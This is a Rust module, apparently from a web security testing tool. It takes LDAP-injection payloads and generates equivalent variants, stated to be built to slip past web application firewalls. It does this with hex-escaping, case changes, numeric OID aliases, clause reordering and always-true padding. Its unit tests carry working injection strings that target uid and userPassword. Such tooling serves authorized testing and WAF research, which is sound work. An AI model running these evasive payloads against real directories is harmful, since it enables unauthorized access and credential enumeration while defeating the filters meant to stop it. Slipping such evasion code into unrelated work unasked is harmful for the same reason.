//! LDAP-injection payload-string equivalence + the joint
//! `(payload × delivery)` generator — the LDAP arm of Phase B.
//!
//! The sound equivalence here is RFC 4515 §3 assertion-value escaping:
//! ANY byte of an LDAP filter assertion value may be written as `\`
//! followed by two hex digits, and the directory server unescapes it
//! before matching. So `admin` ≡ `\61dmin` ≡ `adm\69n` — identical at
//! the LDAP server, very different to a WAF. Attribute *descriptors*
//! are also case-insensitive (`uid` ≡ `UID`). The filter-break
//! structure (`)(`, `*`, `(|`, `(&`) is the injection mechanism and is
//! preserved verbatim (anti-rig). Every member is re-verified by
//! [`still_matches`].

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

/// RFC 4519 / RFC 1274 / RFC 4524 registered attribute-type ↔ numeric
/// OID pairs. Per RFC 4512 §2.5 an attribute type MAY be referenced by
/// its `numericoid`; a conformant directory resolves the OID and the
/// short name to the SAME attribute, so `(uid=x)` and
/// `(0.9.2342.19200300.100.1.1=x)` select identical entries — while a
/// WAF signature matching `uid=` / `cn=` sees neither. Names are stored
/// lowercase (LDAP descriptors are case-insensitive, RFC 4512 §2.5).
const OID_ALIASES: &[(&str, &str)] = &[
    ("uid", "0.9.2342.19200300.100.1.1"),
    ("cn", "2.5.4.3"),
    ("objectclass", "2.5.4.0"),
    ("mail", "0.9.2342.19200300.100.1.3"),
    ("sn", "2.5.4.4"),
    ("userpassword", "2.5.4.35"),
    ("givenname", "2.5.4.42"),
    ("telephonenumber", "2.5.4.20"),
    ("uidnumber", "1.3.6.1.1.1.1.0"),
    ("member", "2.5.4.31"),
];

/// LDAP-unescape `\XX`, lowercase, and fold any registered numeric OID
/// in attribute-descriptor position back to its canonical short name,
/// so escaped / cased / OID-aliased variants ALL normalise to exactly
/// what the directory actually matches. Folding is applied identically
/// to the original and every candidate, so it is a sound consistent
/// equivalence relation (the OID≡name fact is RFC-registered, not a
/// guess).
fn normalize(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut o = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == '\\' && i + 2 < b.len() && b[i + 1].is_ascii_hexdigit() && b[i + 2].is_ascii_hexdigit()
        {
            let h: String = b[i + 1..i + 3].iter().collect();
            if let Some(c) = u8::from_str_radix(&h, 16).ok().map(|x| x as char) {
                o.push(c.to_ascii_lowercase());
                i += 3;
                continue;
            }
        }
        o.push(b[i].to_ascii_lowercase());
        i += 1;
    }
    // Fold OID → canonical name in descriptor position. An OID directly
    // followed by `=` (equality/presence/substring) or `:` (extensible
    // match) is unambiguously an attribute descriptor in LDAP filter
    // syntax — a value never takes `<numericoid>=` form.
    for (name, oid) in OID_ALIASES {
        if o.contains(oid) {
            o = o.replace(&format!("{oid}="), &format!("{name}="));
            o = o.replace(&format!("{oid}:"), &format!("{name}:"));
        }
    }
    o
}

/// Looks like an LDAP-injection payload (a filter-break or wildcard
/// against an attribute) — else the generator emits nothing.
fn is_ldap_injection(s: &str) -> bool {
    let n = normalize(s);
    let structural = n.contains(")(")
        || n.contains("(|")
        || n.contains("(&")
        || n.contains(")(|")
        || n.contains("*)")
        || n.contains("=*")
        || n.starts_with('*')
        || n.ends_with('*');
    let attr = n.contains("uid=")
        || n.contains("cn=")
        || n.contains("mail=")
        || n.contains("objectclass=")
        || n.contains("userpassword=")
        || n.contains("=*")
        || n.contains('*');
    structural && attr
}

/// Significant assertion tokens (alnum runs ≥ 3) — the injection's
/// targeted attributes/values that must survive.
fn sig(n: &str) -> Vec<String> {
    n.split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|t| t.len() >= 3)
        .map(str::to_string)
        .collect()
}

/// True iff `cand` still expresses the original LDAP injection.
#[must_use]
pub fn still_matches(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !is_ldap_injection(original) {
        return false;
    }
    let no = normalize(original);
    let nc = normalize(cand);
    // structural break must survive
    let break_ok = ["(|", "(&", ")(", "=*", "*)"]
        .iter()
        .filter(|m| no.contains(*m))
        .all(|m| nc.contains(*m))
        || (no.contains('*') && nc.contains('*'));
    if !break_ok {
        return false;
    }
    let want = sig(&no);
    if want.is_empty() {
        return !nc.is_empty();
    }
    want.iter().all(|t| nc.contains(t.as_str()))
}

// ── rewrites (LDAP-equivalent) ─────────────────────────────────────

const STRUCTURAL: &[char] = &['(', ')', '&', '|', '=', '*', '!'];

/// RFC 4515 hex-escape of value characters (never the structural
/// filter chars). `admin` → `\61dm\69n`. Server-identical.
fn rw_hex_escape(s: &str, rng: &mut Rng) -> String {
    // RFC 4515 permits `\XX` ONLY in an assertion VALUE — never in the
    // attribute descriptor. Escaping the descriptor (`\75id=`) yields
    // an INVALID filter the directory rejects (was an unsound bug).
    // Track value position: inside `( attr op <VALUE> )`.
    let mut out = String::with_capacity(s.len() * 2);
    let mut in_value = false;
    for ch in s.chars() {
        match ch {
            '(' | ')' => in_value = false,
            '=' => in_value = true,
            _ => {}
        }
        if in_value
            && ch != '='
            && ch.is_ascii_alphanumeric()
            && !STRUCTURAL.contains(&ch)
            && rng.chance(2, 5)
        {
            out.push_str(&format!("\\{:02X}", ch as u32));
        } else {
            out.push(ch);
        }
    }
    out
}

/// Case-permute LDAP attribute descriptors (case-insensitive per
/// RFC 4512) — the run of letters immediately before a `=`.
fn rw_attr_case(s: &str, rng: &mut Rng) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut out: Vec<char> = b.clone();
    let mut i = 0;
    while i < b.len() {
        if b[i] == '=' {
            // walk back over the attribute name
            let mut j = i;
            while j > 0 && (b[j - 1].is_ascii_alphanumeric() || b[j - 1] == '-') {
                j -= 1;
            }
            for k in j..i {
                if b[k].is_ascii_alphabetic() {
                    out[k] = if rng.chance(1, 2) {
                        b[k].to_ascii_uppercase()
                    } else {
                        b[k].to_ascii_lowercase()
                    };
                }
            }
        }
        i += 1;
    }
    out.into_iter().collect()
}

/// RFC 4512 §2.5: reference an attribute type by its registered
/// numeric OID instead of its short name. `(uid=*)` → `(0.9.2342.\
/// 19200300.100.1.1=*)`. The directory resolves both to the same
/// attribute; a WAF keyed on `uid=` / `cn=` matches neither.
/// Descriptor-position only (the run of letters before `=` / `:`) —
/// never the value (anti-rig: the injection's value bytes are
/// untouched). `normalize` folds the OID back so [`still_matches`]
/// independently re-confirms equivalence.
fn rw_oid_alias(s: &str, rng: &mut Rng) -> Option<String> {
    let b: Vec<char> = s.chars().collect();
    // Collect (start,end) spans of attribute descriptors: a maximal
    // run of [A-Za-z0-9.-] ending immediately before `=` or `:` and
    // beginning right after a filter-structural opener.
    let mut spans: Vec<(usize, usize)> = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == '=' || b[i] == ':' {
            let mut j = i;
            while j > 0 && (b[j - 1].is_ascii_alphanumeric() || b[j - 1] == '-' || b[j - 1] == '.')
            {
                j -= 1;
            }
            // descriptor must start a clause (preceded by ( & | ! or
            // be at string start) — otherwise it is value text.
            let ok_start =
                j == 0 || matches!(b[j - 1], '(' | '&' | '|' | '!' | ')');
            if ok_start && j < i {
                let name: String = b[j..i].iter().collect::<String>().to_ascii_lowercase();
                if OID_ALIASES.iter().any(|(n, _)| *n == name) {
                    spans.push((j, i));
                }
            }
        }
        i += 1;
    }
    if spans.is_empty() {
        return None;
    }
    // Deterministically pick ONE descriptor to alias (keeps the member
    // distinct from the all-aliased full form; diversity across seeds).
    let pick = rng.below(spans.len());
    let (st, en) = spans[pick];
    let name: String = b[st..en].iter().collect::<String>().to_ascii_lowercase();
    let oid = OID_ALIASES.iter().find(|(n, _)| *n == name).map(|(_, o)| *o)?;
    let mut out = String::with_capacity(s.len() + 24);
    out.extend(b[..st].iter());
    out.push_str(oid);
    out.extend(b[en..].iter());
    Some(out)
}

/// Indices of the top-level child clauses `(...)` directly inside the
/// balanced group that starts at `open` (`b[open]=='('`). Returns the
/// `(start,end_exclusive)` of each immediate child and the index just
/// past the group's closing paren.
fn child_clauses(b: &[char], open: usize) -> Option<(Vec<(usize, usize)>, usize)> {
    if open >= b.len() || b[open] != '(' {
        return None;
    }
    let mut depth = 0i32;
    let mut children = Vec::new();
    let mut k = open;
    let mut cur_start: Option<usize> = None;
    while k < b.len() {
        match b[k] {
            '(' => {
                depth += 1;
                if depth == 2 && cur_start.is_none() {
                    cur_start = Some(k);
                }
            }
            ')' => {
                depth -= 1;
                if depth == 1 {
                    if let Some(cs) = cur_start.take() {
                        children.push((cs, k + 1));
                    }
                }
                if depth == 0 {
                    return Some((children, k + 1));
                }
            }
            _ => {}
        }
        k += 1;
    }
    None
}

/// AND/OR are commutative in LDAP filter evaluation (RFC 4511 §4.5.1):
/// `(&(A)(B)(C))` ≡ `(&(C)(B)(A))`, same for `|`. Reverse the sibling
/// order of the first multi-child `(&…)` / `(|…)` group — every token
/// and structural marker is preserved, the match set is identical.
fn rw_filter_commute(s: &str, _rng: &mut Rng) -> Option<String> {
    let b: Vec<char> = s.chars().collect();
    for open in 0..b.len() {
        if b[open] == '('
            && open + 1 < b.len()
            && (b[open + 1] == '&' || b[open + 1] == '|')
            && let Some((children, _end)) = child_clauses(&b, open)
            && children.len() >= 2
        {
            let conn = b[open + 1];
            let inner_start = open + 2;
            let mut rebuilt = String::with_capacity(s.len());
            rebuilt.extend(b[..open].iter());
            rebuilt.push('(');
            rebuilt.push(conn);
            // any chars between the connective and the first child
            // (normally none) are preserved before the reversed kids.
            if let Some(&(fc, _)) = children.first() {
                rebuilt.extend(b[inner_start..fc].iter());
            }
            for &(cs, ce) in children.iter().rev() {
                rebuilt.extend(b[cs..ce].iter());
            }
            // close the group + tail.
            let group_close = {
                let (_, e) = child_clauses(&b, open)?;
                e
            };
            rebuilt.push(')');
            rebuilt.extend(b[group_close..].iter());
            if rebuilt != s {
                return Some(rebuilt);
            }
        }
    }
    None
}

/// AND-identity (RFC 4511 §4.5.1): `X ∧ true ≡ X`. `(objectClass=*)`
/// is a presence filter that every directory entry satisfies (RFC 4512
/// §2.4: every entry has an `objectClass`). Insert it as an extra
/// sibling of an `(&…)` group — match set unchanged, structure the WAF
/// signatures on is now padded. NEVER applied to `(|…)` (there
/// `X ∨ true ≡ true`, which would change the result — anti-rig).
fn rw_presence_pad(s: &str, _rng: &mut Rng) -> Option<String> {
    let b: Vec<char> = s.chars().collect();
    for open in 0..b.len() {
        if b[open] == '('
            && open + 1 < b.len()
            && b[open + 1] == '&'
            && let Some((children, _)) = child_clauses(&b, open)
            && !children.is_empty()
        {
            let first = children[0].0;
            let mut out = String::with_capacity(s.len() + 16);
            out.extend(b[..first].iter());
            out.push_str("(objectClass=*)");
            out.extend(b[first..].iter());
            return Some(out);
        }
    }
    None
}

/// Maximal RFC 4515 §3 escaping: `\XX` EVERY value byte (not a random
/// subset). `admin` → `\61\64\6d\69\6e`. The directory unescapes byte
/// for byte (server-identical); a WAF sees zero literal value
/// characters. Descriptor + structural chars untouched.
fn rw_full_hex(s: &str, _rng: &mut Rng) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    let mut in_value = false;
    for ch in s.chars() {
        match ch {
            '(' | ')' => in_value = false,
            '=' => {
                in_value = true;
                out.push(ch);
                continue;
            }
            _ => {}
        }
        if in_value && ch.is_ascii_alphanumeric() && !STRUCTURAL.contains(&ch) {
            out.push_str(&format!("\\{:02X}", ch as u32));
        } else {
            out.push(ch);
        }
    }
    out
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_matches(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        // ── structural layer (token-preserving, applied first) ──
        if rng.chance(2, 5)
            && let Some(n) = rw_filter_commute(&s, &mut rng)
        {
            s = n;
            rules.push("and_or_commute");
        }
        if rng.chance(1, 3)
            && let Some(n) = rw_presence_pad(&s, &mut rng)
        {
            s = n;
            rules.push("presence_identity_pad");
        }
        if rng.chance(1, 2)
            && let Some(n) = rw_oid_alias(&s, &mut rng)
        {
            s = n;
            rules.push("oid_alias");
        }
        // ── value-escape layer (mutually exclusive: full XOR partial,
        // never both — re-escaping an `\XX` would corrupt it) ──
        if rng.chance(2, 5) {
            let n = rw_full_hex(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("rfc4515_full_hex");
            }
        } else if rng.chance(4, 5) {
            let n = rw_hex_escape(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("rfc4515_hex_escape");
            }
        }
        if rng.chance(3, 5) {
            let n = rw_attr_case(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("attr_case");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_matches(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 40,
            verify: true,
            vary_delivery: true,
            param: "q".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn hex_escape_is_server_equivalent() {
        assert_eq!(normalize("\\61dmin"), "admin");
        assert_eq!(normalize("adm\\69n"), "admin");
        // RFC 4515: escape the VALUE only, never the attribute desc.
        assert!(still_matches("*)(uid=admin)", "*)(uid=\\61dm\\69n)"));
        assert!(still_matches("*)(uid=*)", "*)(UID=*)"));
        // value-only escaping never touches the descriptor:
        let esc = rw_hex_escape("*)(uid=admin)", &mut Rng::new(1));
        assert!(esc.contains("uid="), "attribute descriptor was escaped (invalid LDAP): {esc}");
    }

    #[test]
    fn structural_break_and_targets_preserved() {
        let atk = "*)(|(uid=*))(|(userPassword=*";
        let v = generate(atk, &cfg(4));
        assert!(!v.is_empty());
        for m in &v {
            assert!(still_matches(atk, &m.payload), "unsound {:?}", m.payload);
            let nc = normalize(&m.payload);
            assert!(nc.contains("uid") && nc.contains("userpassword"));
            assert!(nc.contains("(|") && nc.contains(")("));
        }
    }

    #[test]
    fn non_ldap_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("hello world", &cfg(1)).is_empty());
        assert!(generate("just=a=value", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_and_diverse() {
        let a: Vec<_> = generate("*)(uid=*))(|(uid=*", &cfg(9))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = generate("*)(uid=*))(|(uid=*", &cfg(9))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b);
        let d: std::collections::HashSet<_> = a.iter().collect();
        assert!(d.len() >= 4, "too few distinct: {}", d.len());
    }

    // ───────── OID aliasing (RFC 4512 §2.5) ─────────

    #[test]
    fn oid_alias_is_directory_equivalent_and_waf_opaque() {
        // The registered OID and the short name normalise identically
        // (a conformant directory resolves both to the same attribute).
        assert_eq!(
            normalize("*)(0.9.2342.19200300.100.1.1=*)"),
            normalize("*)(uid=*)")
        );
        assert_eq!(normalize("(2.5.4.3=bob)"), normalize("(cn=bob)"));
        assert!(still_matches(
            "*)(uid=admin)",
            "*)(0.9.2342.19200300.100.1.1=admin)"
        ));
        // The alias rewrite removes the literal `uid` a WAF keys on,
        // and the value bytes are untouched (anti-rig).
        let aliased = rw_oid_alias("*)(uid=admin)", &mut Rng::new(2)).expect("uid is aliasable");
        assert!(!aliased.contains("uid="), "WAF token survived: {aliased}");
        assert!(aliased.contains("=admin"), "value mutated: {aliased}");
        assert!(still_matches("*)(uid=admin)", &aliased));
    }

    #[test]
    fn wrong_oid_substitution_is_rejected_not_claimed_equivalent() {
        // 2.5.4.3 == cn, NOT uid. Swapping uid→cn-OID targets a
        // DIFFERENT attribute; the verifier must reject it. (Anti-rig:
        // equivalence holds only for the RFC-registered pair, never
        // "any OID looks fine".)
        assert!(
            !still_matches("*)(uid=admin)", "*)(2.5.4.3=admin)"),
            "uid≠cn: a different-attribute swap must NOT verify as equivalent"
        );
        assert_ne!(normalize("(uid=x)"), normalize("(2.5.4.3=x)"));
        // A made-up/unregistered OID is not folded → not equivalent.
        assert!(!still_matches("*)(uid=admin)", "*)(1.2.3.4.5.6=admin)"));
        // rw_oid_alias only fires on a descriptor it actually knows.
        assert!(rw_oid_alias("*)(unknownattr=admin)", &mut Rng::new(1)).is_none());
    }

    // ───────── AND/OR commutativity (RFC 4511 §4.5.1) ─────────

    #[test]
    fn commute_preserves_match_set_and_every_token() {
        let atk = "*)(&(uid=admin)(userPassword=secret))";
        let c = rw_filter_commute(atk, &mut Rng::new(1)).expect("multi-child AND commutes");
        assert_ne!(c, atk, "order must actually change");
        assert!(still_matches(atk, &c), "commuted AND is not equivalent: {c}");
        let nc = normalize(&c);
        assert!(nc.contains("uid") && nc.contains("userpassword"));
        assert!(still_matches(
            "(|(cn=a)(cn=b))",
            "(|(cn=b)(cn=a))"
        ));
        // Single-child group has nothing to commute.
        assert!(rw_filter_commute("(&(uid=*))", &mut Rng::new(1)).is_none());
    }

    // ───────── presence-identity padding (AND-identity only) ─────────

    #[test]
    fn presence_pad_is_and_identity_and_never_corrupts_an_or() {
        // (&(uid=*)) ≡ (&(objectClass=*)(uid=*)) — X ∧ true ≡ X.
        let p = rw_presence_pad("*)(&(uid=admin))", &mut Rng::new(1))
            .expect("an AND group accepts an always-true sibling");
        assert!(p.contains("(objectClass=*)"), "pad missing: {p}");
        assert!(still_matches("*)(&(uid=admin))", &p));
        // CRITICAL anti-rig: an OR group must NEVER be padded with an
        // always-true clause — `X ∨ true ≡ true` changes the result.
        // The rewrite must refuse it at the source (still_matches alone
        // cannot catch this — it only checks token survival).
        assert!(
            rw_presence_pad("*)(|(uid=admin))", &mut Rng::new(1)).is_none(),
            "padding an OR with objectClass=* is UNSOUND and must be refused"
        );
        assert!(rw_presence_pad("*)(uid=*)", &mut Rng::new(1)).is_none());
    }

    // ───────── maximal value escaping ─────────

    #[test]
    fn full_hex_escapes_every_value_byte_server_identically() {
        let f = rw_full_hex("*)(uid=admin)", &mut Rng::new(1));
        assert!(!f.contains("admin"), "literal value survived: {f}");
        assert!(f.contains("uid="), "descriptor must NOT be escaped: {f}");
        assert!(f.contains("\\61") && f.contains("\\6E"), "not full-hex: {f}");
        assert!(still_matches("*)(uid=admin)", &f));
        // sanity: the escaped value unescapes to the original.
        assert_eq!(normalize(&f), normalize("*)(uid=admin)"));
    }

    #[test]
    fn generator_emits_the_new_sound_classes_and_all_verify() {
        // Must carry LITERAL alnum values: `rfc4515_full_hex` escapes
        // value bytes, so a wildcard-only payload (`uid=*`) has nothing
        // to escape and the class is legitimately unreachable on it —
        // asserting it there would assert a falsehood. A real
        // credential-bearing filter-break exercises all four classes.
        let atk = "*)(&(uid=admin)(userPassword=secret))";
        let mut seen_rules: std::collections::HashSet<&'static str> =
            std::collections::HashSet::new();
        for seed in 0..40u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(
                    still_matches(atk, &m.payload),
                    "UNSOUND member {:?} (rules {:?})",
                    m.payload,
                    m.rules
                );
                for r in &m.rules {
                    seen_rules.insert(r);
                }
            }
        }
        for need in ["oid_alias", "and_or_commute", "presence_identity_pad", "rfc4515_full_hex"] {
            assert!(
                seen_rules.contains(need),
                "new sound class {need:?} never produced across 40 seeds (have {seen_rules:?})"
            );
        }
    }
}
